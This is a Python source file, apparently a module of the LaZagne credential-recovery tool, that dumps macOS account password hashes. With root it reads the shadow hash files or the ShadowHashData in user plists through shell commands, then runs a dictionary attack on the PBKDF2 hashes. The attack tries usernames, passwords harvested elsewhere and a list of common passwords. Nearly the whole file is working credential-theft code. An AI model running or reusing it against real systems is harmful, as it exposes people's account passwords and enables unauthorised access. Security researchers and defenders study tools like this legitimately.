# -*- coding: utf-8 -*- 
# !/usr/bin/python

# Inspired from :
# https://apple.stackexchange.com/questions/220729/what-type-of-hash-are-a-macs-password-stored-in
# https://www.onlinehashcrack.com/how-to-extract-hashes-crack-mac-osx-passwords.php

# TO DO: retrieve hash on mac os Lion without need root access:
# https://hackademics.fr/forum/hacking-connaissances-avancées/unhash/1098-mac-os-x-python-os-x-lion-password-cracker

import subprocess
import traceback
import binascii
import platform
import hashlib
import base64
import os

from xml.etree import ElementTree

from lazagne.config.module_info import ModuleInfo
from lazagne.config.dico import get_dic
from lazagne.config.constant import constant


class HashDump(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'hashdump', 'system')

        self.username = None
        self.iterations = None
        self.salt_hex = None
        self.entropy_hex = None

    def root_access(self):
        if os.getuid() != 0:
            self.warning('You need more privileges (run it with sudo)')
            return False
        return True

    def check_version(self):
        major, minor = 0, 0
        try:
            v, _, _ = platform.mac_ver()
            v = '.'.join(v.split('.')[:2])
            major = v.split('.')[0]
            minor = v.split('.')[1]
        except Exception:
            self.debug(traceback.format_exc())

        return int(major), int(minor)

    def run_cmd(self, cmd):
        p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        result, _ = p.communicate()
        if result:
            return result
        else:
            return ''

    def list_users(self):
        users_dir = '/Users'
        users_list = []
        if os.path.exists(users_dir):
            for user in os.listdir(users_dir):
                if user != 'Shared' and not user.startswith('.'):
                    users_list.append(user)

        return users_list

    # works for all version (< 10.8)
    def get_hash_using_guid(self, guid):
        cmd = 'cat /var/db/shadow/hash/%s' % guid
        hash = self.run_cmd(cmd)
        if hash:
            self.info('Full hash found : %s ' % hash)
            # Salted sha1: hash[104:152]
            # Zero salted sha1: hash[168:216]
            # NTLM: hash[64:]
            return hash[168:216]
        else:
            return False

    # this technique works only for OS X 10.3 and 10.4
    def get_user_hash_using_niutil(self, username):
        # get guid
        cmd = 'niutil -readprop . /users/{username} generateduid'.format(username=username)
        guid = self.run_cmd(cmd)
        if guid:
            guid = guid.strip()
            self.info('GUID found : {guid}'.format(guid=guid))

            # get hash
            hash_ = self.get_hash_using_guid(guid)
            if hash_:
                return username, hash_

        return False

    # this technique works only for OS X 10.5 and 10.6
    def get_user_hash_using_dscl(self, username):
        # get guid
        cmd = 'dscl localhost -read /Search/Users/{username} | grep GeneratedUID | cut -c15-'.format(username=username)
        guid = self.run_cmd(cmd)
        if guid:
            guid = guid.strip()
            self.info('GUID found : {guid}'.format(guid=guid))

            # get hash
            hash_ = self.get_hash_using_guid(guid)
            if hash_:
                return username, hash_

        return False

    # this technic works only for OS X >= 10.8
    def get_user_hash_from_plist(self, username):
        try:
            cmd = 'sudo defaults read /var/db/dslocal/nodes/Default/users/{username}.plist ' \
                  'ShadowHashData|tr -dc 0-9a-f|xxd -r -p|plutil -convert xml1 - -o - 2> /dev/null'.format(
                    username=username
            )
            raw = self.run_cmd(cmd)

            if len(raw) > 100:
                root = ElementTree.fromstring(raw)
                children = root[0][1].getchildren()
                entropy64 = ''.join(children[1].text.split())
                iterations = children[3].text
                salt64 = ''.join(children[5].text.split())
                entropy_raw = base64.b64decode(entropy64)
                entropy_hex = entropy_raw.encode("hex")
                salt_raw = base64.b64decode(salt64)
                salt_hex = salt_raw.encode("hex")

                self.username = username
                self.iterations = int(iterations)
                self.salt_hex = salt_hex
                self.entropy_hex = entropy_hex

                return '{username}:$ml${iterations}${salt}${entropy}'.format(
                    username=username,
                    iterations=iterations,
                    salt=salt_hex,
                    entropy=entropy_hex
                )
        except Exception:
            self.debug(traceback.format_exc())

    # ------------------------------- Dictionary attack -------------------------------

    def dictionary_attack(self, username, dic, pbkdf2=True):
        found = False
        try:
            if pbkdf2:
                self.info('Dictionary attack started !')
                for word in dic:
                    self.info('Trying word: %s' % word)
                    if str(self.entropy_hex) == str(
                            self.dictionary_attack_pbkdf2(str(word), binascii.unhexlify(self.salt_hex),
                                                          self.iterations)):
                        constant.system_pwd.append(
                            {
                                'Account': username,
                                'Password': word
                            }
                        )
                        self.info('Password found: {word}'.format(word=word))
                        found = True
                        break
        except (KeyboardInterrupt, SystemExit):
            self.debug('Dictionary attack interrupted')

        return found

    # On OS X >= 10.8
    # System passwords are stored using pbkdf2 algorithm
    def dictionary_attack_pbkdf2(self, password, salt, iterations):
        hex = hashlib.pbkdf2_hmac('sha512', password, salt, iterations, 128)
        password_hash = binascii.hexlify(hex)
        return password_hash

    # ------------------------------- End of Dictionary attack -------------------------------

    def run(self):
        user_hashes = []

        if self.root_access():
            major, minor = self.check_version()
            if major == 10 and (minor == 3 or minor == 4):
                for user in self.list_users():
                    self.info('User found: {user}'.format(user=user))
                    user_hash = self.get_user_hash_using_niutil(user)
                    if user_hash:
                        user_hashes.append(user_hash)

            if major == 10 and (minor == 5 or minor == 6):
                for user in self.list_users():
                    self.info('User found: {user}'.format(user=user))
                    user_hash = self.get_user_hash_using_dscl(user)
                    if user_hash:
                        user_hashes.append(user_hash)

            # TO DO: manage version 10.7

            elif major == 10 and minor >= 8:
                user_names = [plist.split(".")[0] for plist in os.listdir(u'/var/db/dslocal/nodes/Default/users/') if not plist.startswith(u'_')]
                for username in user_names:
                    user_hash = self.get_user_hash_from_plist(username)
                    if user_hash:
                        user_hashes.append(user_hash)

                        # try to get the password in clear text

                        passwords = constant.passwordFound  # check if previous passwords are used as system password
                        passwords.insert(0, username)  # check for weak password (login equal password)
                        if constant.user_password:
                            passwords.insert(0, constant.user_password)

                        found = self.dictionary_attack(username, passwords)

                        # realize a dictionary attack using the 500 most famous passwords
                        if constant.dictionary_attack and not found:
                            dic = get_dic()
                            dic.insert(0, self.username)
                            self.dictionary_attack(username, dic)

        return ['__SYSTEM__', user_hashes]
